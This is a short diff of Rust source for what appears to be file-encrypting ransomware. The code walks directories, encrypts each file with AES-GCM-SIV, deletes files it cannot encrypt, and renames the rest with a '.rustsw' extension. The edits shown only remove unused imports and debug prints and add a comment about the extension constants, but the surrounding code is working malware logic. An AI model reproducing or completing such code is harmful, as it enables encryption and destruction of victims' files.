@@ -4,12 +4,11 @@ use aes_gcm_siv::aead::generic_array::typenum::{UInt, UTerm};
 use aes_gcm_siv::aead::generic_array::GenericArray;
 use aes_gcm_siv::aead::{Aead, NewAead};
 use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
-use rand::prelude::*;
-use rand_hc::Hc128Rng;
 use std::fs;
-use std::path::{self, Path};
+use std::path::Path;
 use walkdir::WalkDir;
 
+// Global vars of the extension in case you want to change it, make sure they are both the same like here and the first one starts with a dot.
 const ENCRYPTED_EXTENSION: &str = ".rustsw";
 const ENCRYPTED_EXTENSION_WITHOUT_DOT: &str = "rustsw";
 
@@ -102,7 +101,6 @@ impl Encryptor256bit {
                 None => (),
             }
 
-            println!("Name: {}", &file); // HACK DEBUG print
             self.encrypt_file_else_delete(&file);
 
             fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION);
@@ -248,7 +246,6 @@ impl Encryptor128bit {
                 None => (),
             }
 
-            println!("Name: {}", &file); // HACK DEBUG print
             self.encrypt_file_else_delete(&file);
 
             fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION);
